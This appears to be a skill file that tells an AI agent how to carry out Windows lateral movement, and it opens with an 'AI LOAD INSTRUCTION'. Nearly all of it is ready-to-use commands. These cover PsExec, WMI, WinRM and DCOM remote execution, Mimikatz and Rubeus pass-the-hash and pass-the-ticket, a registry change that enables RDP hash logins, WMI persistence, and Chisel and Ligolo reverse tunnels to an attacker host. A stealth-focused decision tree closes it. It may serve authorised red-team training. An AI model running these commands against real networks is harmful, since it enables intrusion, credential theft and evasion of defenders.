---
name: windows-lateral-movement
description: >-
  Windows lateral movement playbook. Use when pivoting between Windows hosts via PsExec, WMI, WinRM, DCOM, RDP, pass-the-hash, overpass-the-hash, or pass-the-ticket techniques.
---

# SKILL: Windows Lateral Movement — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert Windows lateral movement techniques. Covers PsExec, WMI, WinRM, DCOM, SMB, RDP, SSH, pass-the-hash, overpass-the-hash, pass-the-ticket, and pivoting. Base models miss execution method fingerprints, OPSEC trade-offs, and credential type requirements per method.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) after landing on a new host for local escalation
- [windows-av-evasion](../windows-av-evasion/SKILL.md) when EDR blocks lateral movement tools
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) for Kerberos-based lateral (pass-the-ticket, delegation)
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for ACL-based paths to new hosts

### Advanced Reference

Also load [CREDENTIAL_DUMPING.md](./CREDENTIAL_DUMPING.md) when you need:
- LSASS dump techniques (MiniDump, comsvcs.dll, nanodump)
- SAM/SYSTEM/SECURITY extraction
- DPAPI, credential manager, cached domain credentials
- NTDS.dit extraction methods

---

## 1. REMOTE EXECUTION METHODS COMPARISON

| Method | Port | Cred Type | Creates Service? | File on Disk? | OPSEC | Admin Required? |
|---|---|---|---|---|---|---|
| **PsExec** | 445 (SMB) | Password/Hash | Yes (PSEXESVC) | Yes (.exe) | Low | Yes |
| **Impacket smbexec** | 445 | Password/Hash | Yes (temp service) | No | Medium | Yes |
| **Impacket atexec** | 445 | Password/Hash | No (scheduled task) | No | Medium | Yes |
| **WMI** | 135+dynamic | Password/Hash | No | No | High | Yes |
| **WinRM** | 5985/5986 | Password/Hash/Ticket | No | No | High | Yes (Remote Mgmt) |
| **DCOM** | 135+dynamic | Password/Hash | No | No | High | Yes |
| **RDP** | 3389 | Password/Hash (RestrictedAdmin) | No | No | Low (GUI session) | RDP access |
| **SSH** | 22 | Password/Key | No | No | High | SSH enabled |
| **SC** | 445 | Password/Hash | Yes (custom service) | Yes | Low | Yes |

---

## 2. PSEXEC VARIANTS

### Impacket PsExec

```bash
# With password
psexec.py DOMAIN/administrator:password@TARGET_IP

# With NTLM hash (pass-the-hash)
psexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP

# With Kerberos ticket
export KRB5CCNAME=admin.ccache
psexec.py -k -no-pass DOMAIN/administrator@target.domain.com
```

### Impacket smbexec (Stealthier — No Binary Upload)

```bash
smbexec.py DOMAIN/administrator:password@TARGET_IP
smbexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP
```

### Impacket atexec (Scheduled Task)

```bash
atexec.py DOMAIN/administrator:password@TARGET_IP "whoami"
atexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP "whoami"
```

### Sysinternals PsExec

```cmd
PsExec64.exe \\TARGET -u DOMAIN\administrator -p password cmd.exe
PsExec64.exe \\TARGET -s cmd.exe    & REM Run as SYSTEM (-s)
PsExec64.exe \\TARGET -accepteula -s -d cmd.exe /c "C:\temp\payload.exe"
```

---

## 3. WMI LATERAL MOVEMENT

```bash
# Impacket wmiexec
wmiexec.py DOMAIN/administrator:password@TARGET_IP
wmiexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP

# With Kerberos
export KRB5CCNAME=admin.ccache
wmiexec.py -k -no-pass DOMAIN/administrator@target.domain.com
```

```powershell
# PowerShell WMI process creation
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\out.txt" -ComputerName TARGET -Credential $cred

# WMI event subscription persistence
$filterArgs = @{
    EventNamespace = 'root\cimv2'; Name = 'Updater';
    QueryLanguage = 'WQL';
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
```

---

## 4. WINRM LATERAL MOVEMENT

```bash
# evil-winrm (from Linux — with password)
evil-winrm -i TARGET_IP -u administrator -p password

# evil-winrm (with hash)
evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH

# evil-winrm (with Kerberos)
evil-winrm -i target.domain.com -r DOMAIN.COM
```

```powershell
# PowerShell remoting
$cred = Get-Credential
Enter-PSSession -ComputerName TARGET -Credential $cred

# Execute command remotely
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }

# Multiple targets simultaneously
Invoke-Command -ComputerName TARGET1,TARGET2 -Credential $cred -ScriptBlock { hostname; whoami }
```

---

## 5. DCOM LATERAL MOVEMENT

Stealthy — uses legitimate COM objects, no service creation.

### MMC20.Application

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\temp\out.txt","7")
```

### ShellWindows

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c whoami > C:\temp\out.txt","C:\Windows\System32",$null,0)
```

### ShellBrowserWindow

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","TARGET"))
$com.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
```

### Impacket dcomexec

```bash
dcomexec.py DOMAIN/administrator:password@TARGET_IP
dcomexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP -object MMC20
```

---

## 6. PASS-THE-HASH (PTH)

Use NTLM hash directly without knowing the plaintext password.

```bash
# CrackMapExec — spray/check admin access
crackmapexec smb TARGETS -u administrator -H NTLM_HASH

# Impacket tools (all support -hashes)
psexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET
wmiexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET
smbexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET

# evil-winrm
evil-winrm -i TARGET -u user -H NTLM_HASH

# xfreerdp (Restricted Admin mode must be enabled)
xfreerdp /v:TARGET /u:administrator /pth:NTLM_HASH /d:DOMAIN
```

```cmd
# Mimikatz PTH (spawns new process with injected creds)
sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:HASH /run:cmd.exe
```

### Enable Restricted Admin for RDP PTH

```cmd
# On target (requires admin): enable restricted admin
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

---

## 7. OVERPASS-THE-HASH (PASS-THE-KEY)

Convert NTLM hash → Kerberos TGT → pure Kerberos authentication.

```bash
# Request TGT with hash
getTGT.py DOMAIN/user -hashes :NTLM_HASH -dc-ip DC_IP
export KRB5CCNAME=user.ccache

# Or with AES256 key
getTGT.py DOMAIN/user -aesKey AES256_KEY -dc-ip DC_IP

# Use Kerberos for all subsequent tools
psexec.py -k -no-pass DOMAIN/user@target.domain.com
wmiexec.py -k -no-pass DOMAIN/user@target.domain.com
```

```cmd
# Mimikatz overpass-the-hash
sekurlsa::pth /user:user /domain:DOMAIN /ntlm:HASH /run:powershell.exe
# New PowerShell session → klist shows Kerberos TGT
```

**Advantage**: Pure Kerberos auth avoids NTLM logging and detection.

---

## 8. PASS-THE-TICKET

```bash
# Use existing .ccache ticket
export KRB5CCNAME=/path/to/admin.ccache
psexec.py -k -no-pass DOMAIN/admin@target.domain.com
```

```cmd
# Mimikatz — inject .kirbi ticket
kerberos::ptt ticket.kirbi
# Verify
klist

# Rubeus
Rubeus.exe ptt /ticket:base64_blob
```

---

## 9. PIVOTING THROUGH COMPROMISED HOSTS

### SSH Tunnel / Port Forward

```bash
# Dynamic SOCKS proxy through compromised host
ssh -D 1080 user@COMPROMISED_HOST
# Use with proxychains

# Local port forward (access internal service)
ssh -L 8888:INTERNAL_TARGET:445 user@COMPROMISED_HOST
```

### Chisel (No SSH Needed)

```bash
# On attacker (server)
chisel server --reverse -p 8080

# On compromised host (client)
chisel client ATTACKER:8080 R:socks
# Creates SOCKS5 proxy on attacker's port 1080
```

### Ligolo-ng (Modern, Fast)

```bash
# On attacker
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# On compromised host
ligolo-agent -connect ATTACKER:11601 -retry -ignore-cert

# In ligolo console
session          # Select agent
start            # Start tunnel
# Add route: sudo ip route add INTERNAL_SUBNET/24 dev ligolo
```

---

## 10. LATERAL MOVEMENT DECISION TREE

```
Have credentials / hash — need to move laterally
│
├── What credentials do you have?
│   ├── Plaintext password → any method
│   ├── NTLM hash → PTH methods (§6)
│   │   ├── Need stealthier? → Overpass-the-Hash first (§7)
│   │   └── Direct use → psexec/wmiexec/evil-winrm with -H
│   ├── Kerberos ticket → Pass-the-Ticket (§8)
│   └── AES key → Overpass-the-Hash with -aesKey (§7)
│
├── OPSEC priority?
│   ├── High stealth needed
│   │   ├── WMI (no file on disk, no service) → wmiexec (§3)
│   │   ├── DCOM (uses legitimate COM) → dcomexec (§5)
│   │   └── WinRM (PowerShell remoting) → evil-winrm (§4)
│   ├── Moderate stealth
│   │   ├── smbexec (no binary upload) (§2)
│   │   └── atexec (scheduled task, auto-cleanup) (§2)
│   └── Low stealth acceptable
│       ├── PsExec (reliable, creates service) (§2)
│       └── RDP (interactive GUI) (§6)
│
├── Need to pivot to internal network?
│   ├── SSH available → SSH tunnel / SOCKS (§9)
│   ├── No SSH → Chisel or Ligolo-ng (§9)
│   └── Multiple hops → chain SOCKS proxies
│
├── Target hardening?
│   ├── SMB signing required → WMI, WinRM, or DCOM
│   ├── WinRM disabled → WMI or DCOM
│   ├── Firewall blocks 135/445 → RDP or SSH
│   └── Restricted Admin disabled → no RDP PTH → use other methods
│
└── Need to dump creds on new host?
    └── Load CREDENTIAL_DUMPING.md
```
